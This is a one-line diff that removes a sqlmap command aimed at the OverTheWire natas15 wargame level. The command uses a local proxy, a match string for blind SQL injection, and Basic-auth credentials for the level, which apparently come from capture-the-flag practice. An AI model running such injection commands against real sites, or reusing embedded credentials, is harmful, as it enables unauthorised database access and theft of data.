@@ -1,1 +1,0 @@
-sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --proxy=http://127.0.0.1:8080 --string="This user exists" --auth-type=Basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16"
